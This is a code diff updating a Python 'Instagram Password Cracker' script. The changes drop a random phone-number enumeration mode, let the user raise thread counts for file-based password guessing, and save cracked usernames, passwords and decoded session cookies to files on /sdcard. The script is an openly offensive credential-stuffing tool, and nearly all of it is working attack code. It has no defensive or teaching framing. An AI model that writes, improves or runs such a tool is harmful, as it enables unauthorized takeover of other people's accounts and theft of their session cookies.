@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Instagram Cracker - Enhanced Version
-Fixed and optimized with cloning functionality
+File-based password cracking with smart patterns
 Author: BITHIKA
 Version: 2.0
 """
@@ -30,7 +30,6 @@ A = "\033[1;97m"   # White
 loop = 0
 oks = []
 cps = []
-idz = []
 
 # Thread-safe locks
 counter_lock = threading.Lock()
@@ -47,14 +46,6 @@ def clear():
 def linex():
     """Print decorative line separator"""
     print(f"\033[1;97m{'='*56}")
-
-def generate_device_hash(uid, pw):
-    """Generate device hash for Instagram API"""
-    hash_obj = hashlib.md5()
-    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
-    hex_digest = hash_obj.hexdigest()
-    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
-    return hash_obj.hexdigest()
 
 def get_password_patterns(uid, name=None):
     """Generate password patterns based on UID and name"""
@@ -279,19 +270,19 @@ def crack(uid, password_list, total_count, name=None):
                    decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
                    cookies = ';'.join(f'{k}={v}' for k,v in decoded.items())
                    print(cookies)
-                   with open("/sdcard/SUMON_INS_TTTTT.txt","a") as f:
+                   with open("/sdcard/SUCCESS_ACCOUNTS.txt","a") as f:
                        f.write(uid+"|"+pw+"|"+cookies+"\n")
                    with success_lock:
                        oks.append(uid)
                    return True       
             elif 'challenge_required' in response.text:
-                with open("/sdcard/SUMON_INS_CH.txt","a") as f:
+                with open("/sdcard/CHALLENGE_ACCOUNTS.txt","a") as f:
                     f.write(uid+"|"+pw+"\n")
                 with success_lock:
                     cps.append(uid)
                 continue
             elif 'checkpoint_required' in response.text:
-                with open("/sdcard/SUMON_INS_CP.txt","a") as f:
+                with open("/sdcard/CHECKPOINT_ACCOUNTS.txt","a") as f:
                     f.write(uid+"|"+pw+"\n")
                 with success_lock:
                     cps.append(uid)
@@ -314,111 +305,13 @@ def crack(uid, password_list, total_count, name=None):
     
     return False
 
-def generate_random_ids(limit):
-    """Generate random 6-digit IDs"""
-    idz.clear()
-    for _ in range(limit):
-        random_id = "".join(random.choice(string.digits) for _ in range(6))
-        idz.append(random_id)
-    return idz
-
-def random_number():
-    """Main random number cloning function"""
-    clear()
-    
-    print(f"\033[1;96m{'='*56}")
-    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
-    print(f"\033[1;96m{'='*56}")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
-    linex()
-    
-    # Get user input
-    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
-    
-    # get user limit
-    try:
-        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
-        if limit <= 0:
-            raise ValueError
-    except ValueError:
-        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
-        limit = 99999
-        time.sleep(2)
-    
-    # Generate random IDs
-    print(f" \033[1;93m[*] Generating {limit} random IDs...")
-    generate_random_ids(limit)
-    
-    # Reset global counters
-    global loop, oks, cps
-    with counter_lock:
-        loop = 0
-    with success_lock:
-        oks.clear()
-    cps.clear()
-    
-    # Display start information
-    clear()
-    print(f"\033[1;96m{'='*56}")
-    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
-    print(f"\033[1;96m{'='*56}")
-    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
-    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
-    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
-    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
-    linex()
-    
-    # Start multi-threaded attack
-    start_time = time.time()
-    
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = []
-        
-        for random_id in idz:
-            uid = code + random_id
-            password_patterns = get_password_patterns(uid)
-            future = executor.submit(crack, uid, password_patterns, len(idz))
-            futures.append(future)
-        
-        # Wait for all tasks to complete
-        for future in as_completed(futures):
-            try:
-                future.result()
-            except KeyboardInterrupt:
-                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
-                executor.shutdown(wait=False)
-                return
-            except Exception as e:
-                print(f"\n\033[1;91m[!] Task failed: {e}")
-    
-    # Calculate execution time
-    end_time = time.time()
-    execution_time = end_time - start_time
-    
-    # Display results
-    linex()
-    print(f"\033[1;92m{'='*56}")
-    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
-    print(f"\033[1;92m{'='*56}")
-    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
-    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
-    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
-    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
-    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
-    
-    if len(oks) > 0:
-        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
-    else:
-        print(f" \033[1;91m[😞] No successful logins found this time.")
-    
-    linex()
-    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")
-
 def file_crack():
     """File-based cracking function"""
     clear()
-    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/AJ.txt')
+    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/users.txt')
+    linex()
+    print(f'{G1}[{A}ℹ{G2}]{G2} File Format: username|name (one per line)')
+    print(f'{G1}[{A}ℹ{G2}]{G2} Example: john_doe|John Doe')
     linex()
     
     # Voice prompt
@@ -441,6 +334,14 @@ def file_crack():
         
         print(f'\n{G1}[{A}+{G1}]{G1} LOADED {len(user_list)} USERS')
         
+        # Ask for threads
+        try:
+            threads = int(input(f'{G1}[{A}?{G2}]{G2} Number of threads (1-100) {A}:{G2} '))
+            if threads < 1 or threads > 100:
+                threads = 20
+        except:
+            threads = 20
+        
         # Reset counters
         global loop, oks, cps
         with counter_lock:
@@ -452,7 +353,7 @@ def file_crack():
         start_time = time.time()
         
         # Process users
-        with ThreadPoolExecutor(max_workers=20) as executor:
+        with ThreadPoolExecutor(max_workers=threads) as executor:
             futures = []
             
             for user_entry in user_list:
@@ -498,62 +399,86 @@ def file_crack():
         linex()
         
         if len(oks) > 0:
-            print(f"{G1}[{A}🎉{G2}]{G2} SUCCESSFUL ACCOUNTS SAVED!")
+            print(f"{G1}[{A}🎉{G2}]{G2} SUCCESSFUL ACCOUNTS SAVED TO: /sdcard/SUCCESS_ACCOUNTS.txt")
+            print(f"{G1}[{A}+{G2}]{G2} First 5 successes:")
+            for i, uid in enumerate(oks[:5]):
+                print(f"  {G1}[{A}{i+1}{G2}]{G2} {uid}")
+        
+        if len(cps) > 0:
+            print(f"\n{G1}[{A}⚠{G2}]{G2} Challenge/Checkpoint accounts saved to separate files")
         
         input(f"\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...")
         
     except FileNotFoundError:
         print(f'{G1}[{A}={G2}]{G2} FILE NOT FOUND ...')
         time.sleep(2)
-        print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
-        time.sleep(2)
-        file_crack()
+        retry = input(f'{G1}[{A}?{G2}]{G2} Try again? (y/n) {A}:{G2} ')
+        if retry.lower() == 'y':
+            file_crack()
     except Exception as e:
         print(f'{G1}[{A}={G2}]{G2} ERROR: {str(e)}')
         time.sleep(2)
+
+def show_statistics():
+    """Show program statistics"""
+    clear()
+    print(f"\033[1;96m{'='*56}")
+    print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
+    print(f"\033[1;96m{'='*56}")
+    print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
+    print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
+    print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
+    print(f" \033[1;97m[💾] Files saved to /sdcard/")
+    print(f"  └─ \033[1;92mSUCCESS_ACCOUNTS.txt")
+    print(f"  └─ \033[1;93mCHALLENGE_ACCOUNTS.txt")
+    print(f"  └─ \033[1;91mCHECKPOINT_ACCOUNTS.txt")
+    linex()
+    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
 
 def menu():
     """Interactive main menu"""
     while True:
         clear()
         print(f"\033[1;96m{'='*56}")
-        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
+        print(f"\033[1;96m     🚀 INSTAGRAM PASSWORD CRACKER 🚀")
         print(f"\033[1;96m{'='*56}")
-        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
-        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📁 File-Based Cracking")
-        print(f" \033[1;97m[\033[1;92m3\033[1;97m] 📊 View Statistics")
-        print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
+        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 📁 File-Based Cracking")
+        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
+        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
         print(f"\033[1;96m{'='*60}")
         
         choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
         
         if choice == '1':
-            random_number()
-        elif choice == '2':
             file_crack()
+        elif choice == '2':
+            show_statistics()
         elif choice == '3':
-            clear()
-            print(f"\033[1;96m{'='*56}")
-            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
-            print(f"\033[1;96m{'='*56}")
-            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
-            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
-            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
-            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
-            linex()
-            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
-        elif choice == '4':
             clear()
             print(f"\033[1;92m{'='*56}")
             print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
             print(f"\033[1;92m{'='*56}")
-            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
+            print(f" \033[1;93m[!] Results saved in /sdcard/")
             print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
             time.sleep(3)
             break
         else:
-            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, 3, or 4.")
+            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
             time.sleep(2)
+
+# ASCII logo
+logo = f"""
+{G1}╔══════════════════════════════════════════════════════╗
+{G1}║    ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗    ║
+{G1}║    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝    ║
+{G1}║    ██║██╔██╗ ██║███████╗   ██║   ███████║██║         ║
+{G1}║    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║         ║
+{G1}║    ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╗    ║
+{G1}║    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ║
+{G1}║    {A}Instagram Password Cracker v2.0               {G1}║
+{G1}║    {A}Author: BITHIKA - All rights reserved           {G1}║
+{G1}╚══════════════════════════════════════════════════════╝
+"""
 
 if __name__ == "__main__":
     try:
@@ -571,6 +496,11 @@ if __name__ == "__main__":
             print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
             print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
             sys.exit(1)
+        
+        # Display logo
+        clear()
+        print(logo)
+        time.sleep(2)
         
         # Start the main menu
         menu()
